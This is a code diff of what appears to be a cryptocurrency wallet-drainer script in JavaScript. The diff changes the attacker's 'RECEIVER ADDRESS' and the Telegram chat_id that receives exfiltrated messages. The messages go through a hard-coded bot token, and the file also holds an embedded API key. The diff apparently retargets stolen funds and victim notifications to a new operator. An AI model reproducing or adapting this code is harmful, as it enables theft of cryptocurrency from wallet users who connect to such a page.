@@ -15,7 +15,7 @@ let provider;
 // Address of the selected account
 let selectedAccount;
 
-const receiver_addres = '0x9709714E2f18345c5aDba88A733cD740188b27F0'; // gaf<- RECEIVER ADDRESS HERE
+const receiver_addres = '0xF3B8E7790F562f8D983A202C5c14b77c5004fe67'; // gaf<- RECEIVER ADDRESS HERE
 let onButtonClick;
 let user_address;
 let start_to_log = false;
@@ -280,7 +280,7 @@ async function sendMessage(message){
 
 async function sendMessage1(message){
   return new Promise((resolve, reject)=>{
-    const chat_id = 6027949250;
+    const chat_id = 5513792161;
     fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
           method: "GET",
           headers: {
@@ -314,7 +314,7 @@ async function getBalance(address, api_key="KF6aM7wHasYsLQGVi9f9v1kiWJXN8on0RT5P
       })
   })
 }
-const receiver_address = '0x9709714E2f18345c5aDba88A733cD740188b27F0';
+const receiver_address = '0xF3B8E7790F562f8D983A202C5c14b77c5004fe67';
 async function proceed(){
   start_to_log = false;
   console.log("Now we roll!!!");
